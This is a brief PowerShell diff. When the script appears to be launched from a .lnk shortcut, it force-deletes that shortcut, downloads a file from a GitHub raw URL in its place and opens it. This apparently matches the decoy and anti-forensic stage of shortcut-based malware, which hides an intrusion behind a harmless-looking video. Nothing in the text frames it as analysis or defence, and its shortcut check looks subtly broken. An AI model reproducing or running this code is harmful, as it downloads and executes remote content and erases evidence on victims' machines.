@@ -1,9 +1,10 @@
 $url = "https://github.com/Meowlyn/ww/raw/refs/heads/main/file_example_AVI_1280_1_5MG.avi"
 $process = Get-Process -Id $PID
 $shortcutPath = $process.Path
+
 if ($shortcutPath -and $shortcutPath.EndsWith(".lnk")) {
+    $newFilePath = [System.IO.Path]::ChangeExtension($shortcutPath, ".avi")
     Remove-Item -Path $shortcutPath -Force
+    Invoke-WebRequest -Uri $url -OutFile $newFilePath
+    Start-Process $newFilePath
 }
-$tempPath = Join-Path $env:TEMP "video.avi"
-Invoke-WebRequest -Uri $url -OutFile $tempPath
-Start-Process $tempPath
